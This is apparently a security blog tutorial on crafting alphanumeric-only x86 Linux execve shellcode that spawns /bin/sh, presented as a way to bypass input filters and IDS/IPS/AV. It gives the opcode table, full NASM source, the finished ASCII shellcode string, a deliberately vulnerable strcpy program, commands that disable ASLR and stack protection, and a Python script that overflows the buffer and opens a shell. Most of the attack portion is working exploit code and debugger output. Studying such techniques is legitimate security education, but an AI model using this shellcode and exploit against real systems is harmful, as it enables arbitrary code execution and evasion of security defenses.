---
layout: single
title: Linux Shellcode - Alphanumeric Execve()
date: 2019-12-30
classes: wide
header:
  teaser: /assets/images/shell.png
tags:
  - Assembly
  - Pentester
  - Linux
  - Shellcode
  - x86
  - Alphanumeric
  - Execve
--- 
![](/assets/images/shell.png)<br>

## Intruduction
Back to shellcode argument, today we will speak about alphanumeric shellcode. This arguement was suggested to me from @nahualito (ty!), some weeks ago and i have to admnit it took me crazy sometimes but it was also a lot fun. The scope of the task is to create a shellcode completely of alphanumeric characters. The reason of this madness is because
> there are several filtering schemes out there being employed by programs that only allow alphanumeric characters to be passed into their buffer<br>

also

> (Alphanumerics) shellcode bypasses many character filters and is somewhat easy to learn due to the fact that many ascii instructions are only one or two byte instructions. The smaller the instructions, the more easily obfuscated and randomized they are. During many buffer overflows the buffer is limited to a very small writeable segment of memory, so many times it is important to utilize the smallest possible combination of opcodes. In other cases, more buffer space is available and things like ascii art shellcode are more plausible.<br>

So we can resume the "Art" of create Alphanumeric Shellcode like an extreme polymorphism that allow us to bypass IDS/IPS/AV agents and this is, at the end, our scope.

## Allowed instructions
The term "alphanumeric" speaks itself, we want to build a shellcode but only with instructions that has opcode fallen in the alphanumeric character range and they can be resumed in this table 

|hexadecimal opcode | char | instruction                    | 
|-------------------|------|--------------------------------|
|30 </r>            | '0'  | xor <r/m8>,<r8>                |
|31 </r>            | '1'  | xor <r/m32>,<r32>              |
|32 </r>            | '2'  | xor <r8>,<r/m8>                |
|33 </r>            | '3'  | xor <r32>,<r/m32>              |
|34 <imm8>          | '4'  | xor al,<imm8>                  |
|35 <imm32>         | '5'  | xor eax,<imm32>                |
|36                 | '6'  | ss:   (Segment Override Prefix)|
|37                 | '7'  | aaa                            |
|38 </r>            | '8'  | cmp <r/m8>,<r8>                |
|39 </r>            | '9'  | cmp <r/m32>,<r32>              |
|                   |      |                                |
|41                 | 'A'  | inc ecx                        |
|42                 | 'B'  | inc edx                        |
|43                 | 'C'  | inc ebx                        |
|44                 | 'D'  | inc esp                        |
|45                 | 'E'  | inc ebp                        |
|46                 | 'F'  | inc esi                        |
|47                 | 'G'  | inc edi                        |
|48                 | 'H'  | dec eax                        |
|49                 | 'I'  | dec ecx                        |
|4A                 | 'J'  | dec edx                        |
|4B                 | 'K'  | dec ebx                        |
|4C                 | 'L'  | dec esp                        |
|4D                 | 'M'  | dec ebp                        |
|4E                 | 'N'  | dec esi                        |
|4F                 | 'O'  | dec edi                        |
|50                 | 'P'  | push eax                       |
|51                 | 'Q'  | push ecx                       |
|52                 | 'R'  | push edx                       |
|53                 | 'S'  | push ebx                       |
|54                 | 'T'  | push esp                       |
|55                 | 'U'  | push ebp                       |
|56                 | 'V'  | push esi                       |
|57                 | 'W'  | push edi                       |
|58                 | 'X'  | pop eax                        |
|59                 | 'Y'  | pop ecx                        |
|5A                 | 'Z'  | pop edx                        |
|                   |      |                                |
|61                 | 'a'  | popa                           |
|62 <...>           | 'b'  | bound <...>                    |
|63 <...>           | 'c'  | arpl <...>                     |
|64                 | 'd'  | fs:   (Segment Override Prefix)|
|65                 | 'e'  | gs:   (Segment Override Prefix)|
|66                 | 'f'  | o16:    (Operand Size Override)|
|67                 | 'g'  | a16:    (Address Size Override)|
|68 <imm32>         | 'h'  | push <imm32>                   |
|69 <...>           | 'i'  | imul <...>                     | 
|6A <imm8>          | 'j'  | push <imm8>                    |
|6B <...>           | 'k'  | imul <...>                     |
|6C <...>           | 'l'  | insb <...>                     |
|6D <...>           | 'm'  | insd <...>                     |
|6E <...>           | 'n'  | outsb <...>                    |
|6F <...>           | 'o'  | outsd <...>                    |
|70 <disp8>         | 'p'  | jo <disp8>                     |
|71 <disp8>         | 'q'  | jno <disp8>                    |
|72 <disp8>         | 'r'  | jb <disp8>                     |
|73 <disp8>         | 's'  | jae <disp8>                    |
|74 <disp8>         | 't'  | je <disp8>                     |
|75 <disp8>         | 'u'  | jne <disp8>                    |
|76 <disp8>         | 'v'  | jbe <disp8>                    |
|77 <disp8>         | 'w'  | ja <disp8>                     |
|78 <disp8>         | 'x'  | js <disp8>                     |
|79 <disp8>         | 'y'  | jns <disp8>                    |
|7A <disp8>         | 'z'  | jp <disp8>                     |
|-------------------|------|--------------------------------|

What can we directly deduct of all this?

- no "mov" instructions: we need to find another way to manipulate our data.
- no interesting arithmetic instructions ("add","sub",...): we can only use DEC and INC and we can't use INC with the EAX register.
- the "xor" instruction: we can use XOR with bytes and doublewords very interesting for basic crypto stuff. 
- "PUSH"/"POP"/"POPAD" INSTRUCTIONS: we can push bytes and doublewords directly on the stack and we can only use POP with the EAX,ECX and EDX registers, it seems we're going to play again with the stack.
- the "o16" operand size override: we can also achieve 16 bits manipulations with this instruction prefix.
- "jmp" and "cmp" instructions: we can realize some comparisons but we can't directly use constant values with CMP.


Not so much eh?! Ah and obviuosly don't forget that operands of these instructions (/r, imm8, imm32, disp8 and disp32) must also remain alphanumeric. It may make our task once again more complicated...<br>

## First alphanumeric instructions
No panic, we can obtain a shellcode with a little of fantasy. The simple idea behind is to store all that we need on the stack and lastly use the POPAD instruction to load the right things in the right places<br>
For the lord of simplicity of our shellcode we'll take the simpliest Linux shellcode to manipulate, the ```execve()``` shellcode.<br>
Our [shellcode](https://blackcloud.me/SLAE32-6/) should work for this purpose:
```nasm
cdq                     ; xor edx
mul edx                 ; xor eax
lea ecx, [eax]          ; xor ecx
mov esi, 0x68732f2f
mov edi, 0x6e69622f
push ecx                ; push NULL in stack
push esi                ; push hs/ in stack
push edi                ; push nib// in stack
lea ebx, [esp]          ; load stack pointer to ebx
mov al, 0xb             ; load execve in eax
int 0x80 
```
The first 3 instructions serves us to put 0 on our registers but as saw we can't directly use this instruction, but we can use a polymorphism to do the same work with PUSh, POP and XOR, using the stack

```nasm
push 0x30      ; push 0x30 on the stack
pop eax        ; place 0x30 in EAX
xor al, 0x30   ; xor EAX with 0x30 to obtain 0
push eax       ; put 0 on the stack
push edx       ; put 0 
```
Nice, now we have to put on the stack the /bin//sh string that will be loaded in EBX register, for this purpose we need to use a XOR starting from 4 letters like XXsh and trasform it in //sh.<br>
A review on XOR logic is usefull here:
- 1 XOR 1 = 0
- 0 XOR 0 = 0
- 1 XOR 0 = 1

so making some binary calculations we can find that XXsh in binary is ```01011000 01011000 01110011 01101000``` and we need //sh that is ```00101111 00101111 01110011 01101000```, what we need is the char to XOR with XXsh to obtain //sh

```bin
    X        X        s        h
01011000 01011000 01110011 01101000
xor
01110111 01110111 01110011 01101000  <------
-----------------------------------
00101111 00101111 01110011 01101000
    /        /        s        h
```
The result is ```01110111 01110111``` or the equivalent hex ```77 77``` or the equivalent chars ww, so we now prepare the asm code to 

```nasm
push 0x68735858	    ; push XXsh
pop eax             ; put XXsh on EAX
xor ax, 0x7777      ; xor with ww
push eax            ; put //sh on the stack
push 0x30           ;
pop eax             ; xor the eax to 0
xor al, 0x30        ;
```
Now we can do a more simple job with /bin, using 0bin in EAX, decremting it by 1 and putting it on the stack after //sh
```nasm
xor eax, 0x6e696230 ; push 0bin
dec eax
push eax
```

Now we have the basic elements for the execve, it's time to load everything in the registers using PUSHAD/POPAD. PUSHAD isn't in the table but POPAD is so what we need to do is to emulate a PUSHAD and then call a POPAD. PUSHAD is an instruction that load registers on the stack in this order: EAX, ECX, EDX, EBX, ESP, EBP, ESI, and EDI
Our PUSHAD is a little bit different: EDX, ECX, EBX, EAX, ESP, EBP, ESI, EDI. In this manner when we call POPAD we will put all the things in the right places.

|PUSHAD instruction | Personalized PUSHAD instruction | 
|-------------------|---------------------------------|
|PUSH EAX |PUSH EDX (0x0)|
|PUSH ECX |PUSH ECX|
|PUSH EDX |PUSH EBX|
|PUSH EBX |PUSH EAX (%esp)|
|PUSH ESP |PUSH ESP|
|PUSH EBP |PUSH EBP|
|PUSH ESI |PUSH ESI|
|PUSH EDI |PUSH EDI|

So let's prepare the code:

```nasm
; pushad/popad to place /bin/sh in EBX register
push esp
pop eax
push edx
push ecx
push ebx
push eax
push esp
push ebp
push esi
push edi
popad
push eax
pop ecx
push ebx
```
The other things we need is the ```0xb``` value in the EAX register, for that purpose we can find a value or more to xor with 0 to obtain 0xb. Doing the same work as for XXsh we can find that ```0x4a``` and after ```0x41``` can help us

```nasm
xor al, 0x4a
xor al, 0x41
```
Now remain the last and the most tedious thing. The ```int 0x80``` syscall that trig our shellcode. We can't use the int instruction so we need to invent another trick.
The ```int 0x80``` has the opcode ```0xcd 0x80``` so we can save the opcode in the stack and jump in that place to trig the syscall. To do that we can use some binary maths and another technique:
- starting from EAX xored to 0
- decrement EAX by 1 to obtain 0xffffffff
- xor AX with 0x4f73
- xor AX with 0x3041
- obtain 0xffff80cd
- push EAX on the stack

```bin
11111111 11111111 - Begin
01000001 00110000 – XOR #1
10111110 11001111 – Result of XOR #1
01110011 01001111 – XOR #2
11001101 10000000 - Result of XOR #2 ($0xcd & $0x80)
```

```nasm
dec eax         ; 0xffffffff in EAX
xor ax, 0x4f73  ;
xor ax, 0x3041  ; 0xffff80cd in EAX
push eax        ; put it on the stack
```
The last problem to solve is that 0xffff80cd must be called as last instruction so living in little endian we need to push the value as first thing. We can summerize the execution with this schema

![](/assets/images/linux/x86/alphanumeric_0.png)<br>

## The Shellcode

```nasm
global _start			

section .text
_start:

       ; int 0x80 ------------
       push 0x30
       pop eax
       xor al, 0x30
       push eax
       pop edx
       dec eax
       xor ax, 0x4f73
       xor ax, 0x3041
       push eax
       push edx
       pop eax
       ;----------------------
       push edx
       push 0x68735858
       pop eax
       xor ax, 0x7777
       push eax
       push 0x30
       pop eax
       xor al, 0x30
       xor eax, 0x6e696230
       dec eax
       push eax

       ; pushad/popad to place /bin/sh in EBX register
       push esp
       pop eax
       push edx
       push ecx
       push ebx
       push eax
       push esp
       push ebp
       push esi
       push edi
       popad
       push eax
       pop ecx
       push ebx

       xor al, 0x4a
       xor al, 0x41
```
For comodity we can transfer the shellcode from nasm to ASCII text: 
```ascii
j0X40PZHf5sOf5A0PRXRj0X40hXXshXf5wwPj0X4050binHPTXRQSPTUVWaPYS4J4A
```
Now we need a simple buffer overflow that permit us to load and execute the shellcode. Let's use a simple C program (bof.c)

```C
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
 
  int main(int argc, char *argv[]){
    char buffer[128];
    strcpy(buffer,  argv[1]);
    return 0;
  }
```
When you test it on new kernels remember to disable the randomize_va_space and to compile the C program with execstack enabled and the stack protector disabled

```bash
# bash -c 'echo "kernel.randomize_va_space = 0" >> /etc/sysctl.conf'
# sysctl -p
# gcc -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 -g bof.c -o bof
```
Next testing the bof program we found that the buffer overflow with EIP overwrite appens with 136 bytes of input, so doing a little math here we can know that: <br>
136 - 66 (shellcode) - 4 (EIP address overwrite) = 66 bytes <br>
so we can pass the first 6 NOP bytes + 66 shellcode bytes + 4 EIP address redirection bytes. Using Peda we have first to find the adress to land to.

![](/assets/images/linux/x86/alphanumeric_0.gif)<br>

As we can see in this case we can choose an adress at the end of NOP zone before our shellcode so ```0xbffff788```. Now we can observe what happens in the stack when we use this address

![](/assets/images/linux/x86/alphanumeric_1.gif)<br>


```
[------------------------------------stack-------------------------------------]
0000| 0xbffff52c --> 0xbffff530 ("/bin//sh")
0004| 0xbffff530 ("/bin//sh")
0008| 0xbffff534 ("//sh")
0012| 0xbffff538 --> 0x0 
0016| 0xbffff53c --> 0xffff80cd 
0020| 0xbffff540 --> 0x0 
0024| 0xbffff544 --> 0xbffff5d4 --> 0xbffff728 ("/home/bolo/alphanumeric/bof")
0028| 0xbffff548 --> 0xbffff5e0 --> 0xbffff7d4 ("LC_PAPER=it_IT.UTF-8")
[------------------------------------------------------------------------------]
```
As we can see we execute perfectly our shellcode since we have to execute it with the ```0xffff80cd``` (int 0x80) instruction. We can see also that the instruction is down 16 words in the stack. So now we can INC ESP 16 times to move the ```0xffff80cd``` address at the top of the stack. INC ESP is in our table of instrctions and has opcdoe 0x44 or "D".<br>
Last thing, call the ```0xffff80cd``` with a JMP ESP instruction. I know it is not in the table of our approved instruction and that's the last trick: the JMP ESP opcode is ```\xff\xe4``` and we can put this opcode just before the return address and not inside the shellcode.

![](/assets/images/linux/x86/alphanumeric_2.gif)<br>

So lastly our command is that
```
./bof `perl -e 'print "\x90"x48 . "j0X40PZHf5sOf5A0PRXRj0X40hXXshXf5wwPj0X4050binHPTXRQSPTUVWaPYS4J4A" . "D"x16 . "\xff\xe4\x79\xf7\xff\xbf"'`
```
Putting all toghether in a python script and execute it

```python
#!/usr/bin/python
import os

print "[*] Loading NOP"
z = "\x90"*48
print "[*] Loading alphanumeric"
z += "j0X40PZHf5sOf5A0PRXRj0X40hXXshXf5wwPj0X4050binHPTXRQSPTUVWaPYS4J4A"
print "[*] Loading syscall"
z += "D"*16
print "[*] Loading JMP and landing address"
z += "\xff\xe4\x79\xf7\xff\xbf"
print "[*] Popping the shell..."
os.system("./bof " + z)
```
![](/assets/images/linux/x86/alphanumeric_3.gif)<br>

## References

-[Phrack Magazine](http://phrack.org/issues/57/15.html)
-[NetSec wiki](https://nets.ec/Ascii_shellcode#The_Kernel_Interrupt)
-[Exploit-Db docs](https://www.exploit-db.com/docs/english/13127-writing-self-modifying-code-andutilizing-advanced-assembly-techniques.pdf)